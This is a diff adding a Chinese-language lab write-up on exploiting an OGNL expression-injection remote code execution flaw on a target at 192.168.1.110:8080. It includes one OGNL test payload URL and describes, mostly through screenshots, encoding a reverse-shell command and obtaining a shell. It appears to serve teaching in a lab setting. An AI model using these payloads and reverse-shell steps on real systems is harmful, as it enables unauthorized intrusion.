+因此这是一个远程代码执行漏洞，所以可以尝试构造对应的`OGNL`的表达式脚本来尝试攻击。
+
+在场景中，针对暴露的第二个靶机端口我们尝试进行攻击：
+
+![status repair](img/status%20repair.png)
+
+![The attack is back](img/The%20attack%20is%20back.png)
+
+根据前文中我们已经构造的payload：
+
+```shell
+http://192.168.1.110:8080/?id=%25%7b+%27test%27+%2b+(2000+%2b+20).toString()%7d
+```
+
+尝试在代码中构造这一表达式：
+
+![attackshell](img/attackshell.png)
+
+运行后，通过burp抓包能够得到：
+
+![endingsone](img/endingsone.png)
+
+Getshell脚本的反弹命令需要进行进行编码转换，所以反弹shell可以使用https://www.ddosi.org/shell/ 在线工具平台转码：
+
+![urlfaccode](img/urlfaccode.png)
+
+![finish_shell](img/finish_shell.png)
+
+对开放端口运行脚本，成功getshell：
+
+![finishshellattack](img/finishshellattack.jpg)
+
+## 参考资料
+
 - [关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告（第二版）](https://www.cnvd.org.cn/webinfo/show/4999)
 - [Oracle Security Alert Advisory - CVE-2019-2725](https://www.oracle.com/security-alerts/alert-cve-2019-2725.html)
 - [Long Term Persistence of JavaBeans Components: XML Schema](https://www.oracle.com/technical-resources/articles/java/persistence3.html)
-- [soap协议注入漏洞挖掘](http://www.smatrix.org/forum/forum.php?mod=viewthread&tid=2525)
+
